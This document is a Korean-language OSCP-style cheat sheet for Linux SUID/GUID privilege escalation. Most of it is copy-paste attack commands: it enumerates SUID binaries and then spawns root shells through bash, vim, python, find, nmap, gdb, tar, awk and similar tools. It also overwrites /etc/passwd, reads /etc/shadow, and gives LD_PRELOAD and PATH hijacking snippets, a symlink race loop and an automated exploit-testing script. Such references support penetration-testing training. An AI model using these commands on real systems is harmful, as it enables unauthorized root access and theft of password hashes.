# Linux SUID/GUID Privilege Escalation

> **OSCP 핵심**: SUID/GUID 파일을 이용한 즉시 root 권한 획득 방법들

## ⚡ 즉시 실행할 명령어들

### 🔍 SUID/GUID 파일 찾기 (10초 안에)

```bash
# SUID 파일 찾기 (가장 중요)
find / -type f -perm -4000 2>/dev/null

# GUID 파일 찾기
find / -type f -perm -2000 2>/dev/null

# SUID + GUID 둘 다
find / -type f \( -perm -4000 -o -perm -2000 \) 2>/dev/null

# 상세 정보와 함께
find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null
```

### 🎯 GTFOBins 우선 체크 (30초 안에)

```bash
# 즉시 체크할 위험한 SUID 바이너리들
find / -type f -perm -4000 2>/dev/null | grep -E "(bash|sh|dash|zsh|fish|csh|tcsh|ksh)"
find / -type f -perm -4000 2>/dev/null | grep -E "(vim|nano|emacs|ed|view)"
find / -type f -perm -4000 2>/dev/null | grep -E "(find|locate|python|python3|perl|ruby|lua|node)"
find / -type f -perm -4000 2>/dev/null | grep -E "(nmap|gdb|strace|ltrace)"
find / -type f -perm -4000 2>/dev/null | grep -E "(more|less|man|pager)"
find / -type f -perm -4000 2>/dev/null | grep -E "(cp|mv|tar|zip|unzip|7z)"
```

### ⚡ 즉시 테스트할 원라이너들

```bash
# 커스텀 SUID 프로그램 우선 확인 (표준 경로 외부)
find / -type f -perm -4000 2>/dev/null | grep -v -E "^/(bin|sbin|usr/(bin|sbin|libexec))"

# SUID 파일의 소유자 확인
find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null | grep -v root

# 쓰기 가능한 SUID 파일 (매우 위험)
find / -type f -perm -4000 -writable 2>/dev/null
```

## 📋 단계별 체크리스트

### Phase 1: 발견 및 분류 (2분)

- [ ] **SUID 파일 전체 찾기**: `find / -type f -perm -4000 2>/dev/null`
- [ ] **GUID 파일 찾기**: `find / -type f -perm -2000 2>/dev/null`
- [ ] **커스텀 바이너리 확인**: 표준 경로 외부 SUID 우선 체크
- [ ] **소유자 확인**: root 소유가 아닌 SUID 파일들 체크
- [ ] **쓰기 권한 확인**: SUID 파일에 쓰기 권한이 있는지 체크

### Phase 2: GTFOBins 대조 (3분)

- [ ] **쉘 바이너리**: bash, sh, zsh 등
- [ ] **에디터**: vim, nano, emacs 등
- [ ] **스크립팅**: python, perl, ruby 등
- [ ] **파일 조작**: find, cp, mv, tar 등
- [ ] **시스템 도구**: nmap, gdb, strace 등
- [ ] **페이저**: more, less, man 등

### Phase 3: 익스플로잇 시도 (5분)

- [ ] **발견된 바이너리별로 GTFOBins 방법 시도**
- [ ] **여러 방법이 있는 경우 모두 시도**
- [ ] **실패시 다음 바이너리로 이동**
- [ ] **성공시 즉시 root 쉘 안정화**

## 🎯 발견별 익스플로잇 방법

### 🐚 쉘 바이너리 (즉시 root!)

```bash
# bash가 SUID인 경우
/usr/bin/bash -p
# 또는
/bin/bash -p

# sh가 SUID인 경우
/bin/sh -p

# zsh가 SUID인 경우
/usr/bin/zsh

# dash가 SUID인 경우
/bin/dash -p
```

### 📝 에디터류

```bash
# vim이 SUID인 경우
/usr/bin/vim -c ':!/bin/sh'
# 또는 vim에서
:set shell=/bin/sh
:shell

# nano가 SUID인 경우
/usr/bin/nano
# nano에서 Ctrl+R, Ctrl+X 누르고
reset; sh 1>&0 2>&0

# emacs가 SUID인 경우
/usr/bin/emacs -Q -nw --eval '(term "/bin/sh")'

# ed가 SUID인 경우
/bin/ed
!/bin/sh

# view가 SUID인 경우
/usr/bin/view -c ':!/bin/sh'
```

### 🐍 스크립팅 언어

```bash
# python이 SUID인 경우
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# 또는
/usr/bin/python -c 'import pty; pty.spawn("/bin/sh")'

# python3이 SUID인 경우
/usr/bin/python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# perl이 SUID인 경우
/usr/bin/perl -e 'exec "/bin/sh";'

# ruby가 SUID인 경우
/usr/bin/ruby -e 'exec "/bin/sh"'

# lua가 SUID인 경우
/usr/bin/lua -e 'os.execute("/bin/sh")'

# node가 SUID인 경우
/usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```

### 🔍 시스템 도구

```bash
# find가 SUID인 경우 (가장 흔함)
/usr/bin/find . -exec /bin/sh -p \; -quit
# 또는
/usr/bin/find . -type f -exec /bin/sh -p \; -quit

# nmap이 SUID인 경우 (구버전)
echo "os.execute('/bin/sh')" > /tmp/shell.nse
/usr/bin/nmap --script=/tmp/shell.nse
# 또는 인터랙티브 모드 (nmap 2.02-5.21)
/usr/bin/nmap --interactive
nmap> !sh

# gdb가 SUID인 경우
/usr/bin/gdb -nx -ex '!sh' -ex quit
# 또는
/usr/bin/gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit

# strace가 SUID인 경우
/usr/bin/strace -o /dev/null /bin/sh -p

# ltrace가 SUID인 경우
/usr/bin/ltrace -b -L -- /bin/sh -p
```

### 📄 페이저류

```bash
# more가 SUID인 경우
TERM= /usr/bin/more /etc/profile
# more 프롬프트에서
!/sh

# less가 SUID인 경우
/usr/bin/less /etc/profile
# less에서
!/sh

# man이 SUID인 경우
/usr/bin/man man
# man 페이지에서
!/sh
```

### 📁 파일 조작 도구

```bash
# cp가 SUID인 경우 (/etc/passwd 덮어쓰기)
echo 'root:$6$salt$password:0:0:root:/root:/bin/bash' > /tmp/passwd
/usr/bin/cp /tmp/passwd /etc/passwd
su root

# 또는 shadow 파일 읽기
/usr/bin/cp /etc/shadow /tmp/shadow
cat /tmp/shadow

# mv가 SUID인 경우
echo 'root:$6$salt$password:0:0:root:/root:/bin/bash' > /tmp/passwd
/usr/bin/mv /etc/passwd /etc/passwd.bak
/usr/bin/mv /tmp/passwd /etc/passwd

# tar가 SUID인 경우
/usr/bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# zip가 SUID인 경우
TF=$(mktemp -u)
/usr/bin/zip $TF /etc/hosts -T -TT 'sh #'

# unzip이 SUID인 경우
echo 'sh' > /tmp/evil.sh
chmod +x /tmp/evil.sh
zip /tmp/exploit.zip /tmp/evil.sh
/usr/bin/unzip -j /tmp/exploit.zip -d /tmp
/tmp/evil.sh
```

### 🔧 기타 유용한 도구들

```bash
# awk가 SUID인 경우
/usr/bin/awk 'BEGIN {system("/bin/sh")}'

# sed가 SUID인 경우
/usr/bin/sed -n '1e exec sh 1>&0' /etc/hosts

# cut가 SUID인 경우 (파일 읽기용)
/usr/bin/cut -d "" -f1 /etc/shadow

# sort가 SUID인 경우 (파일 읽기)
/usr/bin/sort /etc/shadow

# head/tail이 SUID인 경우 (파일 읽기)
/usr/bin/head -c 1G /etc/shadow
/usr/bin/tail -c 1G /etc/shadow

# xxd가 SUID인 경우 (파일 읽기)
/usr/bin/xxd /etc/shadow | xxd -r

# base64가 SUID인 경우 (파일 읽기)
/usr/bin/base64 /etc/shadow | base64 --decode
```

## 🤖 자동화 도구 활용

### 🔍 GTFOBins 자동 체크 스크립트

```bash
# SUID 바이너리와 GTFOBins 매칭 (복붙용)
gtfobins_check() {
    suid_files=$(find / -type f -perm -4000 2>/dev/null)
    gtfobins_list="bash sh dash zsh fish csh tcsh ksh vim nano emacs ed view find locate python python3 perl ruby lua node nmap gdb strace ltrace more less man pager cp mv tar zip unzip 7z awk sed cut sort head tail xxd base64 nc netcat socat curl wget"

    echo "=== SUID files that are in GTFOBins ==="
    for binary in $gtfobins_list; do
        echo "$suid_files" | grep -q "/$binary$" && echo "FOUND: $(echo "$suid_files" | grep "/$binary$")"
    done
}

# 실행
gtfobins_check
```

### 🎯 즉시 익스플로잇 테스트 스크립트

```bash
# 발견된 SUID 바이너리 자동 테스트 (복붙용)
auto_suid_exploit() {
    echo "=== Testing common SUID exploits ==="

    # bash 테스트
    if [ -u /bin/bash ]; then
        echo "Trying bash -p..."
        /bin/bash -p -c 'id && echo "SUCCESS: bash -p worked!"'
    fi

    # find 테스트
    find_binary=$(find / -name "find" -type f -perm -4000 2>/dev/null | head -1)
    if [ ! -z "$find_binary" ]; then
        echo "Trying find exploit..."
        $find_binary . -exec whoami \; -quit 2>/dev/null
    fi

    # vim 테스트
    vim_binary=$(find / -name "vim" -type f -perm -4000 2>/dev/null | head -1)
    if [ ! -z "$vim_binary" ]; then
        echo "Found SUID vim: $vim_binary"
        echo "Manual exploit: $vim_binary -c ':!/bin/sh'"
    fi

    # python 테스트
    python_binary=$(find / -name "python*" -type f -perm -4000 2>/dev/null | head -1)
    if [ ! -z "$python_binary" ]; then
        echo "Trying python exploit..."
        $python_binary -c 'import os; os.system("id")' 2>/dev/null
    fi
}

# 실행
auto_suid_exploit
```

### 🔧 LinPEAS에서 SUID 정보 빠르게 추출

```bash
# LinPEAS 실행 후 SUID 부분만 추출
./linpeas.sh | grep -A 20 -B 5 "SUID.*ROOT"

# 또는 특정 섹션만 실행
./linpeas.sh -o SysI | grep -E "(SUID|sudo|find|vim|python)"
```

## 👀 놓치기 쉬운 것들

### 🚨 자주 놓치는 체크포인트

```bash
# 1. 비표준 경로의 SUID 바이너리들
find /home /tmp /var /opt /usr/local -type f -perm -4000 2>/dev/null

# 2. 심볼릭 링크 SUID (드물지만 존재)
find / -type l -perm -4000 2>/dev/null

# 3. SUID 디렉토리 (디렉토리가 SUID인 경우)
find / -type d -perm -4000 2>/dev/null

# 4. GUID 파일들도 체크 (그룹 권한으로 상승)
find / -type f -perm -2000 2>/dev/null

# 5. 조건부 SUID (특정 조건에서만 실행)
find / -type f -perm -4000 -exec file {} \; 2>/dev/null | grep -i script

# 6. 쓰기 가능한 SUID 바이너리의 디렉토리
find / -type f -perm -4000 -exec dirname {} \; 2>/dev/null | sort -u | xargs ls -la 2>/dev/null

# 7. SUID 바이너리의 라이브러리 의존성
find / -name "*" -type f -perm -4000 2>/dev/null | head -5 | xargs ldd 2>/dev/null

# 8. 환경 변수 상속 가능한 SUID
find / -type f -perm -4000 2>/dev/null | xargs strings 2>/dev/null | grep -E "(PATH|LD_|SHELL)" | head -10

# 9. 최근 수정된 SUID 파일들 (커스텀일 가능성)
find / -type f -perm -4000 -mmin -1440 2>/dev/null

# 10. 숨겨진 SUID 파일들
find / -type f -name ".*" -perm -4000 2>/dev/null
```

### 🔍 고급 SUID 익스플로잇 기법

```bash
# 1. 환경 변수 조작 (PATH 하이재킹)
export PATH=/tmp:$PATH
echo '#!/bin/bash\n/bin/sh -p' > /tmp/ls
chmod +x /tmp/ls
# SUID 바이너리가 ls를 호출하면 우리 스크립트 실행

# 2. LD_PRELOAD 라이브러리 하이재킹
echo 'void _init() { setuid(0); system("/bin/sh"); }' > /tmp/lib.c
gcc -fPIC -shared -o /tmp/lib.so /tmp/lib.c -nostartfiles
export LD_PRELOAD=/tmp/lib.so
# SUID 바이너리 실행

# 3. 함수 라이브러리 하이재킹
nm -D /usr/bin/suid_binary | grep " U " # 사용하는 함수 확인
# 해당 함수를 덮어쓰는 라이브러리 생성

# 4. 레이스 컨디션 (TOCTOU)
while true; do
    ln -sf /etc/passwd /tmp/target 2>/dev/null
    ln -sf /tmp/evil /tmp/target 2>/dev/null
done &
# SUID 바이너리가 /tmp/target 사용시

# 5. 심볼릭 링크 공격
ln -sf /etc/passwd /tmp/link
# SUID 바이너리가 심볼릭 링크를 따라가도록 유도
```

### ⚡ 응급상황 체크리스트 (모든 것이 안될 때)

```bash
# 1. SUID 바이너리 실행시 오류 메시지 확인
strace /usr/bin/suid_binary 2>&1 | grep -E "(ENOENT|access|open)"

# 2. 바이너리의 문자열 분석
strings /usr/bin/suid_binary | grep -E "(sh|bash|system|exec|PATH|tmp)"

# 3. 실행 권한 재확인
ls -la /usr/bin/suid_binary

# 4. 바이너리가 호출하는 다른 프로그램들
ltrace /usr/bin/suid_binary 2>&1 | grep exec

# 5. 파일 종류 재확인 (ELF 바이너리인지 스크립트인지)
file /usr/bin/suid_binary

# 6. 다른 사용자의 SUID 파일들
find / -type f -perm -4000 ! -user root 2>/dev/null

# 7. 그룹 쓰기 가능한 SUID 파일들
find / -type f -perm -4000 -perm -20 2>/dev/null

# 8. capabilities가 설정된 파일들 (SUID 대안)
getcap -r / 2>/dev/null | grep -v "= $"

# 9. SetUID on execution 파일들 체크
find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -la {} \; 2>/dev/null | grep -v "^-..s"

# 10. 마지막 수단: 모든 실행 가능 파일에서 SUID 비트 확인
find /usr/local /opt -type f -executable 2>/dev/null | xargs ls -la 2>/dev/null | grep -E "^-..s"
```

## 🚨 중요 참고사항

### ⏰ 시간 관리

- **처음 2분**: SUID 파일 발견 및 GTFOBins 매칭
- **다음 3분**: 발견된 바이너리들 순서대로 익스플로잇 시도
- **5분 후**: 여전히 안되면 고급 기법이나 다른 벡터 고려

### 🎯 성공률 높은 순서

1. **bash/sh 류**: 발견시 즉시 성공
2. **find**: 가장 흔하고 확실한 방법
3. **vim/nano**: 에디터는 거의 확실
4. **python/perl**: 스크립팅 언어도 높은 성공률
5. **nmap/gdb**: 시스템 도구들
6. **more/less**: 페이저류

### 🔥 즉시 시도할 것들

- 발견된 SUID 중 GTFOBins에 있는 것 우선
- 커스텀 바이너리가 있다면 strings로 분석
- 환경 변수 조작 가능한지 확인
- 실패시 대상 바이너리의 man 페이지 확인

### 💡 팁

- GTFOBins 웹사이트(gtfobins.github.io)를 즐겨찾기 해두기
- 여러 방법이 있는 바이너리는 모든 방법 시도
- 권한 상승 성공시 즉시 `/bin/bash -i` 로 안정화
- root 획득 후 `id && whoami`로 확인
